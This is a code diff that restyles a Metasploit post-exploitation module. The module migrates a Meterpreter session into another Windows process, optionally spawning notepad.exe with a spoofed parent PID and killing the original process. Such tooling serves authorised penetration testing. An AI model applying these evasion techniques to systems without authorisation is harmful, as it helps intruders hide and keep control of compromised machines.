@@ -7,35 +7,57 @@ class MetasploitModule < Msf::Post
   include Msf::Post::Common
   include Msf::Post::Windows::Process
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Process Migration',
-      'Description'   => %q{ This module will migrate a Meterpreter session from one process
-        to another. A given process PID to migrate to or the module can spawn one and
-        migrate to that newly spawned process.},
-      'License'       => MSF_LICENSE,
-      'Author'        => [
-        'Carlos Perez <carlos_perez[at]darkoperator.com>',
-        'phra <https://iwantmore.pizza>'
-      ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Process Migration',
+        'Description' => %q{
+          This module will migrate a Meterpreter session from one process
+          to another. A given process PID to migrate to or the module can spawn one and
+          migrate to that newly spawned process.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'Carlos Perez <carlos_perez[at]darkoperator.com>',
+          'phra <https://iwantmore.pizza>'
+        ],
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              core_migrate
+              stdapi_sys_config_getenv
+              stdapi_sys_process_attach
+              stdapi_sys_process_execute
+              stdapi_sys_process_kill
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
-        OptBool.new(   'SPAWN',[false,'Spawn process to migrate to. If set, notepad.exe is used.', true]),
-        OptInt.new(    'PID',  [false, 'PID of process to migrate to.', 0]),
-        OptInt.new(    'PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing).', 0]),
-        OptString.new( 'PPID_NAME', [false, 'Name of process for PPID spoofing when creating a new process.']),
-        OptString.new( 'NAME', [false, 'Name of process to migrate to.']),
-        OptBool.new(   'KILL', [false, 'Kill original process for the session.', false])
-      ])
+        OptBool.new('SPAWN', [false, 'Spawn process to migrate to. If set, notepad.exe is used.', true]),
+        OptInt.new('PID', [false, 'PID of process to migrate to.', 0]),
+        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing).', 0]),
+        OptString.new('PPID_NAME', [false, 'Name of process for PPID spoofing when creating a new process.']),
+        OptString.new('NAME', [false, 'Name of process to migrate to.']),
+        OptBool.new('KILL', [false, 'Kill original process for the session.', false])
+      ]
+    )
   end
 
-  # Run Method for when run command is issued
   def run
-    print_status("Running module against #{sysinfo['Computer']}")
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module against #{hostname} (#{session.session_host})")
 
     server = session.sys.process.open
     original_pid = server.pid
@@ -43,15 +65,15 @@ class MetasploitModule < Msf::Post
 
     target_pid = nil
 
-    if datastore['SPAWN'] and datastore['SPAWN'] != ""
+    if datastore['SPAWN'] && (datastore['SPAWN'] != '')
       target_pid = create_temp_proc
-    elsif datastore['PID'] and datastore['PID'] != 0
+    elsif datastore['PID'] && (datastore['PID'] != 0)
       target_pid = datastore['PID']
-    elsif datastore['NAME'] and datastore['NAME'] != ""
+    elsif datastore['NAME'] && (datastore['NAME'] != '')
       target_pid = session.sys.process[datastore['NAME']]
     end
 
-    if not target_pid or not has_pid?(target_pid)
+    if !target_pid || !has_pid?(target_pid)
       print_error("Process #{target_pid} not found")
       return
     end
@@ -60,8 +82,8 @@ class MetasploitModule < Msf::Post
       print_status("Migrating into #{target_pid}")
       session.core.migrate(target_pid)
       print_good("Successfully migrated into process #{target_pid}")
-    rescue ::Exception => e
-      print_error("Could not migrate into process")
+    rescue StandardError => e
+      print_error('Could not migrate into process')
       print_error("Exception: #{e.class} : #{e}")
     end
 
@@ -77,16 +99,18 @@ class MetasploitModule < Msf::Post
   end
 
   # Creates a temp notepad.exe to migrate to depending the architecture.
-  def create_temp_proc()
+  def create_temp_proc
     target_ppid = session.sys.process[datastore['PPID_NAME']] || datastore['PPID']
     cmd = get_notepad_pathname(client.arch, client.sys.config.getenv('windir'), client.arch)
 
-    print_status("Spawning notepad.exe process to migrate into")
+    print_status('Spawning notepad.exe process to migrate into')
 
-    if target_ppid != 0 and not has_pid?(target_ppid)
+    if (target_ppid != 0) && !has_pid?(target_ppid)
       print_error("Process #{target_ppid} not found")
       return
-    elsif has_pid?(target_ppid)
+    end
+
+    if has_pid?(target_ppid)
       print_status("Spoofing PPID #{target_ppid}")
     end
 
